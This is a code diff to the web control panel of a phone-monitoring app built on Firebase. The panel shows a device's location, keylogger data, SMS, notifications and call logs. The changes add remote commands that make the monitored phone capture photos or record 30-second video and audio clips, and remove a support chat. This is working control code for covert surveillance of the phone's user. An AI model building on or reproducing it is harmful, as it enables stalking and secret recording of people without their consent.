-                case 'location': return 'location/data'; case 'photo': return 'photo/data'; case 'keylogger': return 'keyLogger/data'; case 'notifications': return 'notificationsMessages/data'; case 'sms': return 'sms/data'; case 'calllogs': return 'Calls'; case 'devicestatus': return 'DeviceStatus'; default: return '';
+                case 'location': return 'location/data'; 
+                case 'photo': return 'photo/data'; 
+                case 'keylogger': return 'keyLogger/data'; 
+                case 'notifications': return 'notificationsMessages/data'; 
+                case 'sms': return 'sms/data'; 
+                case 'calllogs': return 'Calls'; 
+                case 'devicestatus': return 'DeviceStatus';
+                case 'video': return 'video/data';
+                case 'audio': return 'audio/data';
+                default: return '';
             }
         }
 
@@ -1149,30 +1432,19 @@
 
         function closeModal(modalElement) {
             if (!modalElement) return;
+            // हिंदी कमेंट: डेटा लिसनर को बंद करना जब मॉडल बंद हो जाए।
+            if(modalElement.id === 'data-modal' && activeDataListener) {
+                off(activeDataListener.ref);
+                activeDataListener = null;
+            }
             modalElement.classList.remove('visible');
             setTimeout(() => {
                 modalElement.style.display = 'none';
-                const modalId = modalElement.id;
-                if (modalId === 'data-modal') {
-                    if (activeDataListener && activeDataListener.ref) { off(activeDataListener.ref); activeDataListener = null; }
-                    modalDataDisplayArea.innerHTML = '';
-                    modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
-                    fullKeyloggerData = [];
-                    renderedKeyloggerCount = 0;
-                }
-                if (modalId === 'chat-modal') {
-                    if (activeChatListener && activeChatListener.ref) { off(activeChatListener.ref); activeChatListener = null; }
-                    document.getElementById('chat-send-btn').onclick = null;
-                    document.getElementById('chat-message-input').onkeypress = null;
-                }
-                if (modalId === 'admin-notification-modal') {
-                    currentNotificationRef = null;
-                }
             }, 300);
         }
         
         function openDataModal(category) { 
-            modalTitle.textContent = `${getSafeCategoryName(category)} Data`; 
+            modalTitle.textContent = `${getSafeCategoryName(category)}`; 
             openModal(dataModal);
             displayCategoryData(category); 
         }
@@ -1182,57 +1454,94 @@
             openModal(comingSoonModal);
         }
         
-        liveChatBtn.addEventListener('click', () => {
-            if (liveChatBtn.disabled) return;
-            const { userId, childKey } = selectedChildInfo;
-            if (!userId) return;
-            openModal(chatModal);
-            setupChat(userId, childKey);
-        });
-
-        function setupChat(userId, childKey) {
-            const chatMessagesArea = document.getElementById('chat-messages-area');
-            const chatSendBtn = document.getElementById('chat-send-btn');
-            const chatMessageInput = document.getElementById('chat-message-input');
-            const sendMessage = () => {
-                const messageText = chatMessageInput.value.trim();
-                if (messageText) {
-                    const messagesRef = ref(db, `chats/${userId}/${childKey}/messages`);
-                    push(messagesRef, { text: messageText, sender: 'user', timestamp: serverTimestamp() })
-                    .then(() => {
-                        push(messagesRef, { text: 'Your request is in the queue! 🚀\nWe have received your query and will reply within 24 hours.', sender: 'auto-reply', timestamp: serverTimestamp() });
-                    }).catch(error => console.error("Error sending message:", error));
-                    chatMessageInput.value = '';
-                }
-            };
-            chatSendBtn.onclick = sendMessage;
-            chatMessageInput.onkeypress = (e) => { if (e.key === 'Enter') { e.preventDefault(); sendMessage(); } };
-            const chatQuery = query(ref(db, `chats/${userId}/${childKey}/messages`));
-            if (activeChatListener) off(activeChatListener.ref);
-            activeChatListener = { ref: chatQuery };
-            onValue(chatQuery, (snapshot) => {
-                chatMessagesArea.innerHTML = '';
-                if (snapshot.exists()) {
-                    snapshot.forEach((childSnapshot) => {
-                        const message = childSnapshot.val(); const bubble = document.createElement('div'); bubble.classList.add('chat-bubble', message.sender); const time = message.timestamp ? new Date(message.timestamp).toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }) : ''; bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
-                        chatMessagesArea.appendChild(bubble);
-                    });
-                     chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;
-                } else { chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet. Start the conversation!</p>';}
-            });
-        }
-        
         modalDataDisplayArea.addEventListener('click', (e) => {
-            const button = e.target.closest('button'); if (!button) return;
+            const button = e.target.closest('button'); // More generic selector
+            if (!button || button.disabled) return;
+
             const { userId, childKey } = selectedChildInfo;
-            if (button.classList.contains('capture-photo-btn')) {
-                const facing = button.dataset.facing; if (facing === undefined) return;
-                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`); const span = button.querySelector('span'); const originalText = span.textContent; button.disabled = true; span.textContent = 'Sending...';
-                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
-                    .then(() => { span.textContent = 'Command Sent!'; setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); })
-                    .catch((error) => { console.error("Error sending command: ", error); alert("Failed to send command."); span.textContent = originalText; button.disabled = false; });
+            const command = button.dataset.command;
+            
+            // हिंदी कमेंट: एक्सेसिबिलिटी जानकारी वाला पॉप-अप दिखाने का लॉजिक।
+            if(command === 'show-info') {
+                openModal(infoAccessibilityModal);
+                return;
             }
-            if (button.id === 'refresh-photos-btn') { renderPhotosFromDatabase(userId, childKey); }
+            
+            if (command === 'refresh') {
+                const category = button.dataset.category;
+                const span = button.querySelector('span');
+                const originalText = span ? span.textContent : '';
+                if(span) span.textContent = 'Refreshing...';
+                button.disabled = true;
+                
+                // हिंदी कमेंट: अब onValue() के कारण, यह फंक्शन सिर्फ एक बार डेटा फिर से लोड करेगा और लिसनर को फिर से अटैच करेगा।
+                if (category === 'photo') renderPhotosFromDatabase(userId, childKey);
+                if (category === 'video') renderVideosFromDatabase(userId, childKey);
+                if (category === 'audio') renderAudiosFromDatabase(userId, childKey);
+
+                setTimeout(() => {
+                    if(span) span.textContent = originalText;
+                    button.disabled = false;
+                }, 1500);
+                return;
+            }
+
+            let path, value, category;
+
+            switch (command) {
+                case 'capturePhoto':
+                    if (isPhotoCommandRunning) return;
+                    isPhotoCommandRunning = true;
+                    
+                    path = `user/${userId}/${childKey}/photo/params`;
+                    value = { capturePhoto: true, facingPhoto: parseInt(button.dataset.facing) };
+                    sendCommand(button, path, value);
+                    break;
+
+                case 'recordVideo':
+                    if (isVideoCommandRunning) return;
+                    isVideoCommandRunning = true;
+                    category = 'video';
+                    
+                    get(ref(db, `user/${userId}/${childKey}/limits/${category}`)).then((snapshot) => {
+                        const limitInfo = snapshot.val() || { count: 4, usage: 0, date: '1970-01-01' };
+                        const today = new Date().toISOString().slice(0, 10);
+                        const usage = limitInfo.date === today ? limitInfo.usage : 0;
+
+                        if (usage >= limitInfo.count) {
+                            showToast(`You have reached your daily limit for ${category} recording.`);
+                            isVideoCommandRunning = false;
+                            return;
+                        }
+
+                        path = `user/${userId}/${childKey}/video/params`;
+                        value = { recordVideo: true, duration: 30000, facing: parseInt(button.dataset.facing) };
+                        sendCommand(button, path, value, category, limitInfo);
+                    });
+                    break;
+
+                case 'recordAudio':
+                    if (isAudioCommandRunning) return;
+                    isAudioCommandRunning = true;
+                    category = 'audio';
+
+                    get(ref(db, `user/${userId}/${childKey}/limits/${category}`)).then((snapshot) => {
+                        const limitInfo = snapshot.val() || { count: 5, usage: 0, date: '1970-01-01' };
+                        const today = new Date().toISOString().slice(0, 10);
+                        const usage = limitInfo.date === today ? limitInfo.usage : 0;
+
+                        if (usage >= limitInfo.count) {
+                            showToast(`You have reached your daily limit for ${category} recording.`);
+                            isAudioCommandRunning = false;
+                            return;
+                        }
+
+                        path = `user/${userId}/${childKey}/audio/params`;
+                        value = { recordAudio: true, duration: 30000 };
+                        sendCommand(button, path, value, category, limitInfo);
+                    });
+                    break;
+            }
         });
 
         menuBtn.addEventListener('click', () => { sidebar.classList.toggle('open'); overlay.style.display = sidebar.classList.contains('open') ? 'block' : 'none'; });
